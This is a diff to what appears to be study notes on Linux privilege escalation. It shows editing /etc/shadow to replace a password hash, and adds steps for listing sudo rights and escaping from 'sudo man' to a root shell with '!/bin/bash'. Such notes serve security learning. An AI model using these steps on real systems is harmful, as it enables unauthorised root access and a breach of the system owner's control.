@@ -11,3 +11,10 @@ check groups -- ```cat /etc/group```
 6. vim/nano /etc/shadow
 7. replace asterisk with your hash (if Vim, keep cursor on first colon)
 8. login with su
+
+# Exploiting sudo privileges
+```sudo -l``` -- gives a list of commands user can run  
+
+**Exploiting man**  
+1. ```sudo man ls```
+2. type ```!/bin/bash```
